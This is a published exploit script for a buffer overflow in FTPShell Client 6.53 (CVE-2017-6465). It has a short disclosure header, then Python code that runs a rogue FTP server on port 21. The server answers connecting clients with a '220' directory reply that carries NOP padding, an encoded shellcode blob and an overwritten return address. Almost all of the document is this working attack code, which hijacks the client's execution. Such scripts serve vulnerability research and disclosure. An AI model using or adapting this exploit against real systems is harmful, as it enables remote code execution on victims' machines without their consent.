# Exploit Title: FTPShell Client 6.53 buffer overflow on making initial connection
# Date: 2017-03-04
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://www.ftpshell.com/downloadclient.htm
# Version: Windows Server 2008 R2 x64
# Tested on: Windows Server 2008 R2 Standard x64
# CVE: CVE-2017-6465

# 2017-03-04: Software vendor notified
# 2017-03-06: No reply
# 2017-03-06: Publishing

import socket
import sys

shell=("\xba\x7e\xef\x7c\x85\xda\xdf\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x31\x83\xee\xfc\x31\x56\x0f\x03\x56\x71\x0d\x89\x79\x65\x53"
"\x72\x82\x75\x34\xfa\x67\x44\x74\x98\xec\xf6\x44\xea\xa1\xfa"
"\x2f\xbe\x51\x89\x42\x17\x55\x3a\xe8\x41\x58\xbb\x41\xb1\xfb"
"\x3f\x98\xe6\xdb\x7e\x53\xfb\x1a\x47\x8e\xf6\x4f\x10\xc4\xa5"
"\x7f\x15\x90\x75\x0b\x65\x34\xfe\xe8\x3d\x37\x2f\xbf\x36\x6e"
"\xef\x41\x9b\x1a\xa6\x59\xf8\x27\x70\xd1\xca\xdc\x83\x33\x03"
"\x1c\x2f\x7a\xac\xef\x31\xba\x0a\x10\x44\xb2\x69\xad\x5f\x01"
"\x10\x69\xd5\x92\xb2\xfa\x4d\x7f\x43\x2e\x0b\xf4\x4f\x9b\x5f"
"\x52\x53\x1a\xb3\xe8\x6f\x97\x32\x3f\xe6\xe3\x10\x9b\xa3\xb0"
"\x39\xba\x09\x16\x45\xdc\xf2\xc7\xe3\x96\x1e\x13\x9e\xf4\x74"
"\xe2\x2c\x83\x3a\xe4\x2e\x8c\x6a\x8d\x1f\x07\xe5\xca\x9f\xc2"
"\x42\x24\xea\x4f\xe2\xad\xb3\x05\xb7\xb3\x43\xf0\xfb\xcd\xc7"
"\xf1\x83\x29\xd7\x73\x86\x76\x5f\x6f\xfa\xe7\x0a\x8f\xa9\x08"
"\x1f\xec\x2c\x9b\xc3\xdd\xcb\x1b\x61\x22")

port = 21

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[i] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")



# 004b95dc in ftpshell.exe PUSH ESI ; RETN
eip = "\xdc\x95\x4b"
nops = "\x90"*8 
junk = "A"*(400-len(nops)-len(shell))
buffer = nops + shell + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 Welcome to your unfriendly FTP server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')
